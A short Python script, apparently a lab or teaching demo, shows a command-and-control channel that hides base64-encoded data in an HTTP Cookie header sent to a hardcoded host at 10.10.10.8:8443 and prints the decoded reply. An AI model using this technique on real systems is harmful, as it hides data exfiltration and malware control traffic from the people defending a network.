from base64 import b64decode, b64encode

import requests

"""
Hide data in HTTP packet header, disguised as a cookie
"""

def C2(url, data):
    # IRL we would obviously want to encrypt this data, not just encode it.
    response = requests.get(url, headers={"Cookie": b64encode(data)})
    print(b64decode(response.content))


url = "http://10.10.10.8:8443"
data = bytes("C2 data", "utf-8")
C2(url, data)
